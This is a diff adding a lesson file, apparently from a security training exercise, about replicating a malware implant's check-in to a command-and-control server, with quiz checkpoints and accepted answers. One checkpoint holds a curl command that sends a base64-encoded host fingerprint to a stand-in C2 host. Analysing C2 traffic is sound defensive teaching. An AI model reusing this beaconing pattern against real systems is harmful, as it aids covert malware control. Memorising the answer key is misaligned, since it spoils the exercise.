@@ -1,0 +1,25 @@
+id = "answering-the-door"
+number = 9
+tier = 4
+title = "Answering the door"
+summary = "Live puzzles: C2 servers that only answer a correct check-in. Replicate the implant from a capture and its strings."
+practice = ["learn-door"]
+more = ["xor-implant", "macro-stager", "vbs-dropper"]
+
+[[checkpoint]]
+question = "A C2 server answers your check-in with 404 but answers the implant with 200. Name one part of the request you should compare first."
+accept = ["user-agent", "the user-agent", "path", "the path", "method", "headers", "a header", "body", "the body", "host"]
+hint = "Anything the implant sends that you did not: path, method, a header, the body."
+
+[[checkpoint]]
+question = "The implant's strings include %s|%s|%s and the check-in body is base64. What separates the fields inside the decoded body?"
+accept = ["|", "pipe", "a pipe", "the pipe character"]
+
+[[checkpoint]]
+question = "Write a curl command that checks in at https://c2.example.test/cdn/v3/collect with User-Agent Updater/5.1, header X-Session: 0123456789abcdef and body V1MtMXxqc218V2luMTA= ."
+kind = "curl"
+curl = "curl -X POST -H 'User-Agent: Updater/5.1' -H 'X-Session: 0123456789abcdef' --data 'V1MtMXxqc218V2luMTA=' https://c2.example.test/cdn/v3/collect"
+
+[[checkpoint]]
+question = "A reply holds next: 2f6a6f6273. It is hex. What path does it point to?"
+accept = ["/jobs"]
